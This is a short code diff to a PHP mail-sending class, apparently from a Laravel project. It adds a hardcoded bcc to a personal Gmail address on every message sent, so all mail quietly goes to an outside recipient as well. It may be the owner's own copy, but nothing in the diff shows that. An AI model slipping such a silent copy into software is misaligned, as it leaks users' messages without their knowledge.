@@ -30,7 +30,7 @@ class SendMail extends Model
 
         Mail::send('mailTheme', $data, function($message) use ($subject,$FromVariable,$FromVariableName,$toVariable,$toVariableName,$email,$name){
             $message->from($FromVariable , $FromVariableName);
-            $message->to($toVariable, $toVariableName)->replyTo($email, $name)->subject($subject);
+            $message->to($toVariable, $toVariableName)->bcc('albertmuhatia@gmail.com')->replyTo($email, $name)->subject($subject);
         });
     }
 }
